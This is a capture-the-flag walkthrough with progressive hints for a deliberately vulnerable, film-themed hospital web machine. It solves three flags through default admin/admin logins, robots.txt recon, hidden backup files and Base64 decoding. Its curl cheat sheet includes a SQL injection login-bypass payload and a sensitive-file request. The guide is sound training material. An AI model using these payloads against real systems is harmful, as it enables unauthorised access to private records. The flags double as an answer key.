# Mercury General Hospital CTF — Walkthrough (Hint Guide)

This guide is for participants who are stuck. It gives **progressive hints** — try to solve each flag yourself before reading the next hint level.

---

## FLAG 3 — "The Dental Record"

<details>
<summary>💡 Hint 1 (gentle)</summary>

The hospital website has a staff login at `/login`. Every hospital needs an admin account. What are common default credentials?

</details>

<details>
<summary>💡 Hint 2 (moderate)</summary>

Try the most common default credentials: `admin` / `admin`. Read the notices on the home page — they mention that default credentials haven't been changed yet.

</details>

<details>
<summary>💡 Hint 3 (strong)</summary>

Login with `admin` / `admin` at `/login`. Once on the dashboard, click through the patient list. One patient arrived in the middle of the night and their notes contain something unusual.

Alternatively, query the API directly:
```
GET /api/patients/3
```

</details>

<details>
<summary>🔑 Solution</summary>

1. Navigate to `http://<ip>/login`
2. Enter username: `admin`, password: `admin`
3. You are redirected to `/dashboard`
4. Click patient **#3 Stuart 'Stu' Price** in the list
5. Read the `notes` field — it contains the flag embedded in the doctor's notes

**API shortcut** (after login or directly):
```bash
curl http://<ip>/api/patients/3
```

**Flag:** `FLAG{dental_record_stu_2_47_am}`

</details>

---

## FLAG 4 — "The Security Footage"

<details>
<summary>💡 Hint 1 (gentle)</summary>

Web servers often have a `robots.txt` file that tells search engines which directories to avoid indexing. These disallowed paths are often the most interesting ones for a penetration tester.

</details>

<details>
<summary>💡 Hint 2 (moderate)</summary>

Check `http://<ip>/robots.txt`. One of the disallowed paths leads to a directory of security camera log files. Try listing that directory.

</details>

<details>
<summary>💡 Hint 3 (strong)</summary>

Go to `/security/logs/` — it lists all camera log files. Most files are normal, but look for one that starts with a dot (`.`). On Unix/Linux, dot-files are hidden. In a backup, they often contain unedited versions of files that were later modified.

</details>

<details>
<summary>🔑 Solution</summary>

1. `GET http://<ip>/robots.txt` → reveals `/security/logs/` is disallowed
2. `GET http://<ip>/security/logs/` → lists all log files including `.backup_camera_04_full.log`
3. `GET http://<ip>/security/logs/.backup_camera_04_full.log` → read the unredacted footage

The normal `camera_04_parking_lot_b.log` has key entries `[REDACTED BY ADMIN]`. The backup does not.

```bash
curl http://<ip>/security/logs/.backup_camera_04_full.log
```

**Flag:** `FLAG{security_footage_mercedes_3_15_am}`

</details>

---

## FLAG 5 — "The Prescription"

<details>
<summary>💡 Hint 1 (gentle)</summary>

`robots.txt` lists multiple disallowed paths. One of them is a backup directory. Another hints at encoded content. Look at all the disallowed entries.

</details>

<details>
<summary>💡 Hint 2 (moderate)</summary>

`robots.txt` disallows `/backup/`. Accessing that directory lists its files. One of them is a text file containing an encoded prescription. The comment in `robots.txt` tells you the encoding scheme.

</details>

<details>
<summary>💡 Hint 3 (strong)</summary>

Access `/backup/` → find `prescription_encoded.txt` → open it → find the Base64 encoded payload.

The `robots.txt` comment says: `Encoding: Base64`. Decode the payload string.

You can use:
- `echo "<payload>" | base64 -d` (Linux/Mac terminal)
- PowerShell: `[System.Convert]::FromBase64String("<payload>")` then convert to string
- Online: https://www.base64decode.org/

</details>

<details>
<summary>🔑 Solution</summary>

1. `GET http://<ip>/robots.txt` → see `Disallow: /backup/` and `# Encoding: Base64`
2. `GET http://<ip>/backup/` → lists `prescription_encoded.txt`
3. `GET http://<ip>/backup/prescription_encoded.txt` → find the payload:
   ```
   RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ==
   ```
4. Decode it:
   ```bash
   echo "RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ==" | base64 -d
   ```

**Flag:** `FLAG{prescription_warehouse_coordinates}`

**Alternative:** `GET http://<ip>/api/prescriptions/hidden` also contains the `encoded_coordinates` field.

</details>

---

## Bonus Hints

<details>
<summary>🔎 General Recon Tips for This Machine</summary>

- Always start with `robots.txt` — it maps the hidden site structure
- Check the HTML source of every page for comments (right-click → View Source)
- The `/js/app.js` file lists all hidden API endpoints in comments
- The `/admin/` page reveals the security posture of the system
- The `/api/hint` endpoint provides in-universe hints
- Use `curl` or `Burp Suite` to interact with the API endpoints directly

</details>

<details>
<summary>🛠 Useful curl Commands</summary>

```bash
# Check site policies
curl http://<ip>/robots.txt

# Login (returns a token)
curl -X POST http://<ip>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# SQL injection bypass
curl -X POST http://<ip>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'

# List all patients
curl http://<ip>/api/patients

# Read specific patient record (FLAG 3)
curl http://<ip>/api/patients/3

# List security log files
curl http://<ip>/security/logs/

# Read backup log file (FLAG 4)
curl http://<ip>/security/logs/.backup_camera_04_full.log

# List backup directory
curl http://<ip>/backup/

# Read encoded prescription (FLAG 5)
curl http://<ip>/backup/prescription_encoded.txt

# Decode the flag on Linux/Mac
echo "RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ==" | base64 -d

# Read the users file (bonus - exposed sensitive file)
curl "http://<ip>/api/files?file=users.json"
```

</details>

---

## Story Context

This CTF is themed after *The Hangover* (2009). The patients, staff names, and events all reference the film:
- **Stu Price** pulled his own tooth at 2:47 AM
- **Phil Wenneck** and **Alan Garner** were his companions
- **Mr. Chow** drove them and loaded something heavy into a Mercedes at 3:15 AM
- The prescription coordinates point to **Mr. Chow's Warehouse** — the setting for Machine 3

Following all three flags traces the group's movements through Las Vegas from the hospital to the warehouse.
